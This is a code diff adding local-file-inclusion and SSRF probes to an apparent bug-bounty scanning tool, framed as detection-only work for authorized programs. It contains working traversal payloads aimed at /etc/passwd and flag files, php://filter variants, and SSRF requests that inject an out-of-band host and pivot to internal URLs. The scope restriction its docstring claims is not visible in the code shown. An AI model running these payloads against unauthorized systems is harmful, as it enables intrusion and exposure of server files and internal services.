@@ -1768,9 +1768,270 @@ class SSTIFingerprintProbe(DeepScanProbe):
         return findings
 
 
+class LFIFlagProbe(DeepScanProbe):
+    """Local-file-inclusion canary reads.
+
+    Two read targets:
+      * `/etc/passwd` — universal LFI confirmation (response contains
+        `root:x:0:0` only when the server has actually read the file)
+      * `/flag.txt` (and `/flag`, `/flag.html`) — explicit ExampleCorp-style
+        flag-capture target; some programs expose flags at root paths
+        on T&P-class servers, making direct reads possible without
+        traversal at all
+
+    Payload set covers the standard traversal evasions: `..%2f`, `....//`,
+    URL-encoded variants, plus `php://filter` for PHP targets. Params
+    chosen are the highest-yield names from observed LFI write-ups.
+
+    Detection only — never opens shells, never executes the included
+    file, never reads beyond the canary. The point is to surface a lead
+    the operator manually confirms in Burp before submission.
+    """
+    name = "lfi-flag"
+    PAYLOADS = [
+        # (label, payload, canary substring, severity)
+        ("traversal-3",         "../../../etc/passwd",                    "root:x:0:0", "critical"),
+        ("traversal-4",         "../../../../etc/passwd",                 "root:x:0:0", "critical"),
+        ("traversal-5",         "../../../../../etc/passwd",              "root:x:0:0", "critical"),
+        ("traversal-6",         "../../../../../../etc/passwd",           "root:x:0:0", "critical"),
+        ("traversal-url-enc",   "..%2F..%2F..%2Fetc%2Fpasswd",            "root:x:0:0", "critical"),
+        ("traversal-dbl-enc",   "..%252F..%252F..%252Fetc%252Fpasswd",    "root:x:0:0", "critical"),
+        ("traversal-mixed",     "....//....//....//etc/passwd",           "root:x:0:0", "critical"),
+        ("php-filter-passwd",   "php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vdDp4OjA6MA==", "critical"),
+        # Direct flag-target reads — for T&P-style flag.txt hosts where the
+        # flag is at root and no traversal is required
+        ("direct-flag-txt",     "/flag.txt",                              "flag",       "critical"),
+        ("direct-flag",         "/flag",                                  "flag",       "high"),
+        ("direct-flag-html",    "/flag.html",                             "flag",       "high"),
+    ]
+    PARAMS = ("file", "path", "template", "page", "include", "doc",
+              "view", "name", "image", "load", "read", "src")
+    # Cap fan-out: per base we try direct + (params × payloads) but
+    # ceiling at 30 reqs to keep within rate budgets
+    MAX_REQS_PER_BASE = 30
+
+    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
+        findings: list[DeepScanFinding] = []
+        bases = sorted({p["url"] for p in probes
+                        if p.get("status_code") and 200 <= p["status_code"] < 400})
+        if not bases:
+            return findings
+        log.info("lfi-flag", bases=len(bases), payloads=len(self.PAYLOADS))
+
+        from urllib.parse import urlencode
+
+        async def try_direct(base: str, payload: str, canary: str, sev: str, label: str):
+            """Direct path read (no traversal, no param injection)."""
+            url = base.rstrip("/") + payload
+            r = await self._get(url)
+            if r is None or r.status_code != 200:
+                return None
+            body = (r.text or "")[:4096]
+            if canary not in body.lower() and canary not in body:
+                return None
+            return DeepScanFinding(
+                url=url, probe=self.name, signal=f"lfi-direct-{label}",
+                severity=sev,
+                title=f"Direct file read on {base}: {payload}",
+                evidence=body[:300],
+                extra={"payload": payload, "canary": canary},
+            )
+
+        async def try_param(base: str, param: str, payload: str,
+                            canary: str, sev: str, label: str):
+            url = f"{base.rstrip('/')}?{urlencode({param: payload})}"
+            r = await self._get(url)
+            if r is None or r.status_code >= 400:
+                return None
+            body = (r.text or "")[:4096]
+            if canary not in body.lower() and canary not in body:
+                return None
+            return DeepScanFinding(
+                url=url, probe=self.name, signal=f"lfi-param-{label}",
+                severity=sev,
+                title=f"LFI via ?{param}= on {base} ({label})",
+                evidence=body[:300],
+                extra={"param": param, "payload": payload, "canary": canary},
+            )
+
+        coros = []
+        for b in bases:
+            # Budget: direct probes (3) + first few (param × payload) combos
+            reqs_remaining = self.MAX_REQS_PER_BASE
+            for label, payload, canary, sev in self.PAYLOADS:
+                if payload.startswith("/"):
+                    coros.append(try_direct(b, payload, canary, sev, label))
+                    reqs_remaining -= 1
+            for param in self.PARAMS:
+                for label, payload, canary, sev in self.PAYLOADS:
+                    if payload.startswith("/"):
+                        continue
+                    if reqs_remaining <= 0:
+                        break
+                    coros.append(try_param(b, param, payload, canary, sev, label))
+                    reqs_remaining -= 1
+                if reqs_remaining <= 0:
+                    break
+
+        results = await asyncio.gather(*coros, return_exceptions=False)
+        for r in results:
+            if r:
+                findings.append(r)
+        return findings
+
+
+class SSRFOOBProbe(DeepScanProbe):
+    """Server-side request forgery candidate identification + optional
+    out-of-band confirmation + optional internal-target pivot.
+
+    Three operating modes (selected automatically based on env vars):
+
+    1. HEURISTIC (no env vars set, default) — identifies URL-handling
+       params (`url`, `callback`, `redirect_uri`, `image_url`, `source`,
+       `target`, `proxy`, `fetch`, `link`, `dest`, `webhook`) on each
+       base and emits an INFO finding for the operator to manually
+       confirm in Burp. No request to any target involving the param
+       sink — pure surface mapping.
+
+    2. OOB-ACTIVE (`BBSENTINEL_OOB_HOST` set) — injects the OOB host
+       (e.g., Burp Collaborator domain or interactsh client) as each
+       SSRF-prone param's value. Confirmation is the operator checking
+       their OOB listener for incoming DNS/HTTP. Probe emits HIGH
+       finding "SSRF candidate, OOB payload sent" — final confirmation
+       is out of band.
+
+    3. INTERNAL-PIVOT (`BBSENTINEL_OOB_HOST` AND
+       `BBSENTINEL_PIVOT_URLS` set; comma-separated URLs) — after OOB
+       payload, also tries each pivot URL as the param value and
+       inspects the response for a target-identifying substring
+       (default 'flag'). Use only when the program explicitly
+       authorizes reaching specific internal addresses (e.g., a
+       bounty's listed RFC1918 flag-capture targets). The pivot URLs
+       and the substring stay in env vars, NEVER in this file —
+       keeps the probe a generic SSRF tool, with engagement-specific
+       targets supplied at runtime by the operator.
+
+    Strict design rule: this probe NEVER sends pivot URLs in mode 1
+    or to hosts outside `in_scope_hosts`. The pivot is a follow-up
+    that requires both env vars AND the candidate host being in scope.
+    """
+    name = "ssrf-oob"
+    SSRF_PARAMS = (
+        "url", "callback", "redirect_uri", "image", "image_url",
+        "source", "target", "proxy", "fetch", "link", "dest",
+        "webhook", "next", "return_to", "continue", "uri", "src",
+        "preview", "thumbnail", "avatar",
+    )
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        import os
+        self.oob_host = os.environ.get("BBSENTINEL_OOB_HOST") or None
+        pivot = os.environ.get("BBSENTINEL_PIVOT_URLS", "").strip()
+        self.pivot_urls = [u.strip() for u in pivot.split(",") if u.strip()] if pivot else []
+        self.pivot_canary = os.environ.get("BBSENTINEL_PIVOT_CANARY", "flag")
+        self.mode = (
+            "internal-pivot" if (self.oob_host and self.pivot_urls)
+            else "oob-active" if self.oob_host
+            else "heuristic"
+        )
+
+    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
+        findings: list[DeepScanFinding] = []
+        bases = sorted({p["url"] for p in probes
+                        if p.get("status_code") and 200 <= p["status_code"] < 400})
+        if not bases:
+            return findings
+        log.info("ssrf-oob", bases=len(bases), mode=self.mode,
+                 pivot_targets=len(self.pivot_urls))
+
+        from urllib.parse import urlencode, urlparse
+
+        async def probe_base_heuristic(base: str):
+            # Mode 1: just emit info findings naming each SSRF-prone param
+            # found in the base URL's query string, plus a generic note
+            # listing the standard SSRF params we'd want to test manually.
+            pu = urlparse(base)
+            existing_params = []
+            if pu.query:
+                for kv in pu.query.split("&"):
+                    k = kv.split("=", 1)[0]
+                    if k in self.SSRF_PARAMS:
+                        existing_params.append(k)
+            if existing_params:
+                return [DeepScanFinding(
+                    url=base, probe=self.name, signal="ssrf-candidate-param",
+                    severity="info",
+                    title=f"SSRF-prone params present on {base}: {existing_params}",
+                    evidence=f"URL contains: {existing_params}\n"
+                             f"Suggested manual test: set BBSENTINEL_OOB_HOST + "
+                             f"re-run to send OOB payload, or test in Burp.",
+                    extra={"params": existing_params, "mode": self.mode},
+                )]
+            return []
+
+        async def probe_base_active(base: str):
+            # Modes 2 & 3: inject OOB host into each candidate param.
+            results = []
+            for param in self.SSRF_PARAMS:
+                url = f"{base.rstrip('/')}?{urlencode({param: f'http://{self.oob_host}/{param}-{hash(base) & 0xffff:x}'})}"
+                r = await self._get(url)
+                if r is None:
+                    continue
+                # OOB-active: emit HIGH finding; operator confirms via OOB listener
+                results.append(DeepScanFinding(
+                    url=url, probe=self.name, signal="ssrf-oob-sent",
+                    severity="high",
+                    title=f"SSRF OOB payload sent via ?{param}= on {base}",
+                    evidence=(
+                        f"Target: {base}\nParam: {param}\n"
+                        f"OOB host: {self.oob_host}\n"
+                        f"Response status: {r.status_code}\n"
+                        f"Confirm by checking your OOB listener for the "
+                        f"hash-tagged hostname."
+                    ),
+                    extra={"param": param, "oob-host": self.oob_host,
+                           "response-status": r.status_code, "mode": self.mode},
+                ))
+                # Mode 3: also try each pivot URL on this param
+                if self.mode == "internal-pivot":
+                    for pivot in self.pivot_urls:
+                        purl = f"{base.rstrip('/')}?{urlencode({param: pivot})}"
+                        pr = await self._get(purl)
+                        if pr is None:
+                            continue
+                        body = (pr.text or "")[:4096]
+                        if self.pivot_canary.lower() in body.lower():
+                            results.append(DeepScanFinding(
+                                url=purl, probe=self.name,
+                                signal="ssrf-pivot-confirmed",
+                                severity="critical",
+                                title=f"SSRF pivot SUCCESS via ?{param}= → {pivot} on {base}",
+                                evidence=(
+                                    f"Pivot target: {pivot}\n"
+                                    f"Canary '{self.pivot_canary}' present in response.\n"
+                                    f"Response excerpt: {body[:300]}"
+                                ),
+                                extra={"param": param, "pivot-url": pivot,
+                                       "canary": self.pivot_canary,
+                                       "mode": self.mode},
+                            ))
+            return results
+
+        if self.mode == "heuristic":
+            coros = [probe_base_heuristic(b) for b in bases]
+        else:
+            coros = [probe_base_active(b) for b in bases]
+        results = await asyncio.gather(*coros, return_exceptions=False)
+        for batch in results:
+            findings.extend(batch)
+        return findings
+
+
 DEFAULT_PROBES = (PathSweep, BackupFileProbe, MethodEnumProbe,
                   Bypass403, CorsProbe, TomcatFingerprint,
                   SpringActuatorProbe, SSTIFingerprintProbe,
+                  LFIFlagProbe, SSRFOOBProbe,
                   WaybackHistorical, JsSecretMine,
                   # OriginCandidateProbe disabled — see TODO on the class.
                   # Surfaced 37 FPs on a single PlanetHoster run because
@@ -1865,6 +2126,7 @@ __all__ = [
     "PathSweep", "BackupFileProbe", "MethodEnumProbe",
     "Bypass403", "CorsProbe", "TomcatFingerprint",
     "SpringActuatorProbe", "SSTIFingerprintProbe",
+    "LFIFlagProbe", "SSRFOOBProbe",
     "WaybackHistorical", "JsSecretMine",
     "OriginCandidateProbe", "OwaspVulnsProbe",
     "HIGH_VALUE_PATHS", "BACKUP_SUFFIXES", "BYPASS_HEADERS", "TOMCAT9_CVE_BANDS",
